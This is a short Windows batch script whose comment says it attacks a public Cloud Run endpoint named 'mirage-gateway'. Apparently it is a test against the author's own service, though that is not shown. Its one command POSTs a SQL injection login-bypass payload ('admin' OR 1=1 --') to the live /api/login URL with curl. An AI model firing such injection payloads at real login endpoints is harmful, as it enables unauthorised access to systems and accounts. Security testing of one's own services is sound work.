@echo off
rem BEAT: attack the PUBLIC Cloud Run endpoint
curl.exe -s -X POST https://mirage-gateway-745571124540.asia-southeast2.run.app/api/login -H "Content-Type: application/json" -d "{\"username\":\"admin' OR 1=1 --\",\"password\":\"x\"}"
echo.
